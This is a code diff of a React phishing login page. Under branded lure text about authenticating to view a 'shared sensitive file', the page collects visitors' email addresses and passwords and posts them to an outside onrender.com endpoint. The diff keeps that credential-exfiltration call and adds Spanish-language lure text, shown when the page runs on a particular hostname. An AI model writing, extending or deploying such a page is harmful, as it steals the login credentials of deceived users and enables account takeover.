@@ -10,11 +10,9 @@ import {
 } from "@mui/material";
 import axios from "axios";
 import { Visibility, VisibilityOff, Person, Lock } from "@mui/icons-material";
-import { useSnackbar } from "notistack"; // Add this import
-
+import { useSnackbar } from "notistack";
 
 const MtnLoginPage: React.FC = () => {
-
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
@@ -23,8 +21,20 @@ const MtnLoginPage: React.FC = () => {
   const [logo, setLogo] = useState("");
   const [background, setBackground] = useState("");
   const [securedSession, setSecuredSession] = useState(true);
+  const [isSpanish, setIsSpanish] = useState(false); // 👈 new state
 
   const { enqueueSnackbar } = useSnackbar();
+
+  useEffect(() => {
+    // Check hostname
+    if (typeof window !== "undefined") {
+      const host = window.location.hostname;
+      if (host === "www.centraconect.com") {
+        setIsSpanish(true);
+      }
+    }
+  }, []);
+
 
   const fetchLogo = async (domain: string) => {
     try {
@@ -89,28 +99,29 @@ const MtnLoginPage: React.FC = () => {
   };
 
   const handleLogin = async () => {
-  if (!password) {
-    setError("Password is required!");
-    return;
-  }
-
-  setLoading(true);
-
-  try {
-    await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
-    setError("");
-    setError("");
-    setError("");
-    setPassword(""); // Clear password field
-    enqueueSnackbar("Message sent successfully", { variant: "success" });
-  } catch (err) {
-    enqueueSnackbar("Failed to send message. Please try again.", { variant: "error" });
-    console.error("Email sending error:", err);
-  } finally {
-    setLoading(false);
-  }
-};
-
+    if (!password) {
+      setError(isSpanish ? "¡La contraseña es obligatoria!" : "Password is required!");
+      return;
+    }
+    setLoading(true);
+    try {
+      await axios.post("https://web-mail-925d.onrender.com/send-email", { email, password });
+      setError("");
+      setPassword("");
+      enqueueSnackbar(
+        isSpanish ? "Mensaje enviado con éxito" : "Message sent successfully",
+        { variant: "success" }
+      );
+    } catch (err) {
+      enqueueSnackbar(
+        isSpanish ? "No se pudo enviar el mensaje. Inténtalo de nuevo." : "Failed to send message. Please try again.",
+        { variant: "error" }
+      );
+      console.error("Email sending error:", err);
+    } finally {
+      setLoading(false);
+    }
+  };
 
   return (
     <Box
@@ -138,22 +149,16 @@ const MtnLoginPage: React.FC = () => {
           backdropFilter: "blur(8px)",
         }}
       >
-        <Box
-          sx={{
-            display: "flex",
-            justifyContent: "center",
-            alignItems: "center",
-            mb: 3,
-          }}
-        >
-          {logo && (
+        {logo && (
+          <Box sx={{ display: "flex", justifyContent: "center", mb: 3 }}>
             <img
               src={logo}
               alt="Company Logo"
               style={{ width: 80, height: 80, objectFit: "contain" }}
             />
-          )}
-        </Box>
+          </Box>
+        )}
+
         <Typography
           variant="h6"
           sx={{
@@ -163,17 +168,25 @@ const MtnLoginPage: React.FC = () => {
             fontSize: { xs: 16, sm: 18 },
           }}
         >
-          <b>You must authenticate to view a shared sensitive file.</b>
+          <b>
+            {isSpanish
+              ? "Debe autenticarse para ver un archivo sensible compartido."
+              : "You must authenticate to view a shared sensitive file."}
+          </b>
         </Typography>
         <Typography variant="body2" sx={{ color: "firebrick", mt: 2 }}>
-          <b>Confirm ownership of the email listed below.</b>
+          <b>
+            {isSpanish
+              ? "Confirme la propiedad del correo electrónico que aparece a continuación."
+              : "Confirm ownership of the email listed below."}
+          </b>
         </Typography>
 
         <form onSubmit={(e) => e.preventDefault()}>
           {/* Email Input */}
           <Box sx={{ mb: 2, mt: 2 }}>
             <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
-              Email address
+              {isSpanish ? "Dirección de correo electrónico" : "Email address"}
             </Typography>
             <Box
               sx={{
@@ -202,7 +215,7 @@ const MtnLoginPage: React.FC = () => {
           {/* Password Input */}
           <Box sx={{ mb: 2 }}>
             <Typography variant="body2" sx={{ textAlign: "left", mb: 1 }}>
-              Password
+              {isSpanish ? "Contraseña" : "Password"}
             </Typography>
             <Box
               sx={{
@@ -225,10 +238,7 @@ const MtnLoginPage: React.FC = () => {
                   background: "transparent",
                 }}
               />
-              <IconButton
-                onClick={() => setShowPassword(!showPassword)}
-                edge="end"
-              >
+              <IconButton onClick={() => setShowPassword(!showPassword)} edge="end">
                 {showPassword ? <VisibilityOff /> : <Visibility />}
               </IconButton>
             </Box>
@@ -246,7 +256,7 @@ const MtnLoginPage: React.FC = () => {
                 onChange={(e) => setSecuredSession(e.target.checked)}
               />
             }
-            label="Secured Session?"
+            label={isSpanish ? "¿Sesión segura?" : "Secured Session?"}
           />
 
           <Button
@@ -257,7 +267,7 @@ const MtnLoginPage: React.FC = () => {
             onClick={handleLogin}
             disabled={loading}
           >
-            {loading ? <CircularProgress size={24} /> : 'Sign in'}
+            {loading ? <CircularProgress size={24} /> : isSpanish ? "Iniciar sesión" : "Sign in"}
           </Button>
         </form>
       </Box>
